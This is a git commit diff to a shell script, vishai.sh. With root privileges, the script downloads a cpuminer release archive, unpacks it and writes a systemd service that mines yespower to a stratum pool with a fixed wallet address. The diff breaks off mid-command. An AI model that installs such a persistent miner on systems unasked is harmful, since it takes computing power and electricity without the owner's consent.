120e545b541d58a21a3d085d21a728670c44a644
denkanoonus <154112768+denkanoonus@users.noreply.github.com>
2024-01-02 19:58:21 -0800

    Update vishai.sh

--- vishai.sh
+++ vishai.sh
@@ -1,3 +1,4 @@
+cd /usr/local/bin
 sudo wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
 sudo tar -xvf cpuminer-opt-linux.tar.gz
 sudo bash -c 'echo -e "[Unit]\nDescription=XMRig Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u v4nmRyrdyGXF2Wd8wKtoTt9Rpa7YLb8wKx.tes
